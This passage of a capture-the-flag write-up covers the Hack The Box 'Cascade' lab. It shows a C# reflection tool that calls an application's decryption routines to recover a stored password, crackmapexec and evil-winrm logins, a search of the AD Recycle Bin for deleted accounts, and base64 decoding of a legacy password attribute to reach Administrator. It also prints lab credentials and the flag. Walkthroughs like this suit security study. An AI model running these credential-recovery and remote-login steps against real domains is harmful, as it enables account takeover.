                Assembly a2 = Assembly.LoadFrom(f);
                if (!loaded.Contains(a2)) { loaded.Add(a2); Console.WriteLine("Loaded extra exe-as-assembly: " + a2.FullName + " (" + Path.GetFileName(f) + ")"); }
            } catch {}
        }

        // Collect all types across loaded assemblies
        List<Type> allTypes = new List<Type>();
        foreach (Assembly a in loaded) {
            try {
                Type[] ts = null;
                try { ts = a.GetTypes(); } catch (ReflectionTypeLoadException rtle) { ts = rtle.Types; }
                if (ts != null) {
                    foreach (Type t in ts) if (t != null) allTypes.Add(t);
                }
            } catch {}
        }

        Console.WriteLine("Total types collected: " + allTypes.Count);

        string[] patterns = new string[] { "Decrypt", "DecryptString", "Unprotect", "ProtectedData", "Decode", "FromBase64", "DPAPI", "GetPassword", "ReadPassword", "Crypto" };
        List<Tuple<Type, MethodInfo>> candidates = new List<Tuple<Type, MethodInfo>>();

        foreach (Type t in allTypes) {
            MethodInfo[] methods = null;
            try { methods = t.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance); }
            catch { continue; }
            foreach (MethodInfo m in methods) {
                string mn = m.Name ?? "";
                bool match = false;
                for (int i = 0; i < patterns.Length; i++) {
                    if (mn.IndexOf(patterns[i], StringComparison.OrdinalIgnoreCase) >= 0) { match = true; break; }
                }
                if (match) {
                    candidates.Add(new Tuple<Type, MethodInfo>(t, m));
                }
            }
        }

        Console.WriteLine("Found " + candidates.Count + " candidate methods matching patterns.");

        // Try highest-confidence signature: static or instance DecryptString(string,string)
        foreach (var tup in candidates) {
            Type t = tup.Item1;
            MethodInfo m = tup.Item2;
            ParameterInfo[] ps = m.GetParameters();
            if (ps.Length == 2 && ps[0].ParameterType == typeof(string) && ps[1].ParameterType == typeof(string)) {
                Console.WriteLine("Trying " + t.FullName + "." + m.Name + " (assembly: " + m.Module.Assembly.GetName().Name + ")");
                try {
                    object inst = null;
                    if (!m.IsStatic) {
                        try { inst = Activator.CreateInstance(t); } catch (Exception ex) { Console.WriteLine(" -> cannot instantiate type: " + ex.Message); continue; }
                    }
                    object res = m.Invoke(inst, new object[] { cipher, key });
                    Console.WriteLine("Invocation succeeded. Result:");
                    Console.WriteLine(res == null ? "<null>" : res.ToString());
                    return;
                } catch (TargetInvocationException tie) {
                    Console.WriteLine("Invocation threw: " + (tie.InnerException != null ? tie.InnerException.Message : tie.Message));
                } catch (Exception ex) {
                    Console.WriteLine("Invocation error: " + ex.Message);
                }
            }
        }

        // Try single-string or other plausible signatures
        foreach (var tup in candidates) {
            Type t = tup.Item1;
            MethodInfo m = tup.Item2;
            ParameterInfo[] ps = m.GetParameters();

            // single-string
            if (ps.Length == 1 && ps[0].ParameterType == typeof(string)) {
                Console.WriteLine("Trying single-string " + t.FullName + "." + m.Name + " (assembly: " + m.Module.Assembly.GetName().Name + ")");
                try {
                    object inst = null;
                    if (!m.IsStatic) inst = Activator.CreateInstance(t);
                    object res = m.Invoke(inst, new object[] { cipher });
                    Console.WriteLine("Invocation succeeded. Result:");
                    Console.WriteLine(res == null ? "<null>" : res.ToString());
                    return;
                } catch (Exception ex) {
                    Console.WriteLine("Invocation error: " + ex.Message);
                }
            }

            // parameterless
            if (ps.Length == 0) {
                Console.WriteLine("Trying paramless " + t.FullName + "." + m.Name + " (assembly: " + m.Module.Assembly.GetName().Name + ")");
                try {
                    object inst = null;
                    if (!m.IsStatic) inst = Activator.CreateInstance(t);
                    object res = m.Invoke(inst, null);
                    Console.WriteLine("Invocation succeeded. Result:");
                    Console.WriteLine(res == null ? "<null>" : res.ToString());
                    return;
                } catch (Exception ex) {
                    Console.WriteLine("Invocation error: " + ex.Message);
                }
            }
        }

        // Nothing invoked — print shortlist of candidates for manual inspection.
        Console.WriteLine("\n=== Candidate methods (assembly:type.method(signature)) ===");
        int limit = 0;
        foreach (var tup in candidates) {
            try {
                Type t = tup.Item1;
                MethodInfo m = tup.Item2;
                ParameterInfo[] ps = m.GetParameters();
                string psstr = "";
                for (int j = 0; j < ps.Length; j++) {
                    if (j > 0) psstr += ", ";
                    psstr += ps[j].ParameterType.Name + " " + ps[j].Name;
                }
                Console.WriteLine(m.Module.Assembly.GetName().Name + ":" + t.FullName + "." + m.Name + " -> (" + psstr + ")");
                limit++;
                if (limit > 200) break;
            } catch {}
        }

        Console.WriteLine("\nIf you still don't see the method, open CascCrypto namespace in ILSpy and paste the DecryptString method here and I will port it exactly.");
    }
}
```

need cipher:
```
sqlite3 ./Audit.db "SELECT Uname,Domain,Pwd FROM LDAP;" 
ArkSvc|cascade.local|BQO5l5Kj9MdErXx6Q6AGOw==
```
then with cipher(that base64 string above):
```bash
mcs call_decrypt.cs
mono call_decrypt.exe /path/to/CascAudit.exe 'BQO5l5Kj9MdErXx6Q6AGOw==' 'c4scadek3y654321'
```

pass w3lc0meFr31nd
```
crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

```
evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182
```

we are in as arksvc:
```
net user arksvc
```
```
Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
```
to see what a group does or its scopes:
```
Import-Module ActiveDirectory

Get-ADOptionalFeature -Filter 'Name -like "*Recycle*"' | Select-Object Name, EnabledScopes
```
```
Recycle Bin Feature {CN=Partitions,CN=Configuration,DC=cascade,DC=local, CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local}
```

hmmmm since this is recycle lets look for deleted obj:
```
Import-Module ActiveDirectory

Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Propert
ies *
```

```
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

for temp user... remember above what we saw... will try that last password but holy crap i hope this isnt encrypted...
```
pwdLastSet                      : 132245689883479503
```
did not work... i used same command above for winrm...

lets looks at:
```
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```

this looks base64 encoded:
```
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d       
baCT3r1aN00dles
```

lets try....

temp admin does not work which makes sense he was deleted... ill try against administrator:
```
evil-winrm -u Administrator -p "baCT3r1aN00dles" -i 10.10.10.182
```

```
PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
c1674e331c5a574a6fc795fcda7b5f7d
```

ROOT PWNED!